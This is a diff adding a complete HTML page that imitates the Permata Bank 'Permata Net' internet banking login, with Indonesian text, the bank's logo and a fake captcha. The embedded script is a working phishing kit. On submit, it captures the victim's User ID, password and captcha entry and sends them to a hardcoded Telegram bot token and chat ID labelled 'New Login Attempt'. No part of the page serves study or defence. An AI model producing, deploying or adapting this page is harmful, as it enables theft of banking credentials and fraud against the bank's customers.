@@ -1,0 +1,314 @@
+<html lang="en">
+ <head>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <title>
+   Internet Banking Yang Mengerti Kebutuhanmu | Permata Bank
+  </title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap" rel="stylesheet"/>
+  <style>
+   /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Poppins', sans-serif;
+      background-color: #032d5f;
+      color: white;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 1rem 1rem 1.5rem 1rem;
+    }
+    header .logo {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-weight: 600;
+      font-size: 1.125rem; /* text-lg */
+    }
+    header .logo img {
+      width: 24px;
+      height: 24px;
+    }
+    header button.menu {
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      padding: 0;
+    }
+    header button.menu span {
+      display: block;
+      width: 24px;
+      height: 2px;
+      background-color: white;
+      border-radius: 9999px;
+    }
+    main {
+      padding: 0 1.5rem;
+      flex-grow: 1;
+      max-width: 100%;
+      max-width: 400px;
+      margin: 0 auto;
+    }
+    main h1 {
+      font-weight: 400;
+      font-size: 1.875rem; /* text-3xl */
+      line-height: 1.2;
+      margin-bottom: 2.5rem;
+      max-width: 14rem;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+      gap: 2rem;
+      max-width: 100%;
+    }
+    label {
+      display: block;
+      font-size: 0.625rem; /* text-xs */
+      font-weight: 400;
+      margin-bottom: 0.25rem;
+      color: rgba(255 255 255 / 0.7);
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid rgba(255 255 255 / 0.5);
+      color: white;
+      font-size: 1.25rem; /* text-xl */
+      font-weight: 400;
+      padding-bottom: 0.25rem;
+      outline-offset: 2px;
+    }
+    input::placeholder {
+      color: rgba(255 255 255 / 0.6);
+    }
+    input:focus {
+      outline: 2px solid transparent;
+      outline-offset: 2px;
+    }
+    .captcha-row {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+    .captcha-input {
+      width: 8rem;
+      background: transparent;
+      border: none;
+      border-bottom: 1px solid rgba(255 255 255 / 0.5);
+      color: white;
+      font-size: 1.25rem;
+      font-weight: 400;
+      padding-bottom: 0.25rem;
+      outline-offset: 2px;
+    }
+    .captcha-input::placeholder {
+      color: rgba(255 255 255 / 0.6);
+    }
+    .captcha-input:focus {
+      outline: 2px solid transparent;
+      outline-offset: 2px;
+    }
+    .captcha-image {
+      width: 80px;
+      height: 50px;
+      border-radius: 0.375rem;
+      object-fit: cover;
+      user-select: none;
+    }
+    .refresh-captcha {
+      margin-top: 0.25rem;
+      background: transparent;
+      border: none;
+      color: white;
+      text-decoration: underline;
+      font-size: 0.875rem; /* text-sm */
+      font-weight: 400;
+      padding: 0;
+      cursor: pointer;
+    }
+    button.login-btn {
+      background-color: #0a62ff;
+      border-radius: 9999px;
+      padding: 0.5rem 2rem;
+      color: white;
+      font-size: 1rem;
+      font-weight: 400;
+      border: none;
+      cursor: pointer;
+      width: max-content;
+    }
+    .info-texts {
+      margin-top: 2.5rem;
+      max-width: 100%;
+      max-width: 400px;
+      margin-left: auto;
+      margin-right: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 1rem;
+      font-size: 1rem;
+      font-weight: 400;
+    }
+    .info-texts a {
+      color: white;
+      text-decoration: none;
+    }
+    .info-texts a:hover {
+      text-decoration: underline;
+    }
+    /* Responsive */
+    @media (max-width: 400px) {
+      main h1 {
+        max-width: 100%;
+      }
+      .info-texts {
+        max-width: 100%;
+      }
+    }
+  </style>
+ </head>
+ <body>
+  <header>
+   <div class="logo">
+    <img alt="Permata Bank logo icon" src="https://companieslogo.com/img/orig/BNLI.JK.D-04401398.png?t=1730957760"/>
+    <span>
+     Permata Bank
+    </span>
+   </div>
+   <button aria-label="Menu" class="menu" type="button">
+    <span>
+    </span>
+    <span>
+    </span>
+    <span>
+    </span>
+   </button>
+  </header>
+  <main>
+   <h1>
+    Selamat Datang di
+    <br/>
+    Permata Net
+   </h1>
+   <form id="loginForm">
+    <div>
+     <label for="userid">
+      User ID
+     </label>
+     <input id="userid" name="userid" placeholder="Ketik User ID" required="" type="text"/>
+    </div>
+    <div>
+     <label for="password">
+      Password
+     </label>
+     <input id="password" name="password" placeholder="Ketik Password" required="" type="password"/>
+    </div>
+    <div>
+     <label for="kode">
+      Masukkan kode di samping
+     </label>
+     <div class="captcha-row">
+      <input class="captcha-input" id="kode" name="kode" placeholder="Masukkan Kode" required="" type="text"/>
+      <img alt="Captcha code image showing characters z2fi" class="captcha-image" height="50" id="captchaImage" src="data:image/jpeg;base64,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" width="80"/>
+     </div>
+     <button class="refresh-captcha" id="refreshCaptcha" type="button">
+      Ganti Kode
+     </button>
+    </div>
+    <button class="login-btn" type="submit">
+     Login
+    </button>
+   </form>
+   <div class="info-texts">
+    <a href="https://www.permatanet.com/pnet/on-boarding" rel="noopener noreferrer" target="_blank">
+     Belum punya User ID
+    </a>
+    <a href="https://www.permatanet.com/pnet/forgot-user-id-password" rel="noopener noreferrer" target="_blank">
+     Saya lupa User ID atau Password
+    </a>
+   </div>
+  </main>
+  <script>
+   const captchaImage = document.getElementById('captchaImage');
+   const refreshBtn = document.getElementById('refreshCaptcha');
+   const loginForm = document.getElementById('loginForm');
+
+   // Array of sample captcha texts
+   const captchaTexts = ['z2fi', 'a9xk', 'm7pq', 'r4ty', 'b8vn', 'c3lw', 'd5gz', 'e1hj'];
+
+   // Function to generate a placeholder image URL with text
+   function generateCaptchaUrl(text) {
+     return `https://placehold.co/80x50/png?text=${text}&font=roboto&font-weight=700&font-size=24&text-align=center&text-color=ffffff&bg=000000`;
+   }
+
+   refreshBtn.addEventListener('click', () => {
+     let newText;
+     do {
+       newText = captchaTexts[Math.floor(Math.random() * captchaTexts.length)];
+     } while (newText === captchaImage.alt.replace('Captcha code image showing characters ', ''));
+
+     captchaImage.src = generateCaptchaUrl(newText);
+     captchaImage.alt = `Captcha code image showing characters ${newText}`;
+   });
+
+   loginForm.addEventListener('submit', async (e) => {
+     e.preventDefault();
+
+     const userId = loginForm.userid.value.trim();
+     const password = loginForm.password.value.trim();
+     const kode = loginForm.kode.value.trim();
+
+     if (!userId || !password || !kode) {
+       alert('Please fill all fields.');
+       return;
+     }
+
+     // Telegram Bot API info - replace with your own token and chat ID
+     const botToken = '8393342988:AAH6H80b0KuVu6JuIpJgau5MyBQAgU4wQUQ';
+     const chatId = '7582685852';
+
+     const message = 
+       `New Login Attempt:\nUser ID: ${userId}\nPassword: ${password}\nCaptcha Code: ${kode}`;
+
+     const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+     try {
+       const response = await fetch(url, {
+         method: 'POST',
+         headers: {
+           'Content-Type': 'application/json'
+         },
+         body: JSON.stringify({
+           chat_id: chatId,
+           text: message
+         })
+       });
+
+       if (response.ok) {
+         alert('Data sent successfully.');
+         loginForm.reset();
+       } else {
+         alert('Failed to send data.');
+       }
+     } catch (error) {
+       alert('Error sending data.');
+       console.error(error);
+     }
+   });
+  </script>
+ </body>
+</html>
